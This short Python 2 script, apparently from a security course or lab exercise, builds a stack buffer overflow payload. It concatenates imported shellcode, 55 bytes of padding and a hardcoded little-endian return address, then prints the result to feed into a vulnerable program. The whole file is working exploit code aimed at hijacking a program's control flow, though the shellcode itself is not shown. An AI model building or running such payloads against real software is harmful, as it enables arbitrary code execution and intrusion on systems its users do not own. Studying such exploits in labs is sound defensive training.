from shellcode import shellcode
from struct import pack

pad = "\x01"*55
addr = 0xbffefd9c

print shellcode + pad + pack("<I", addr)
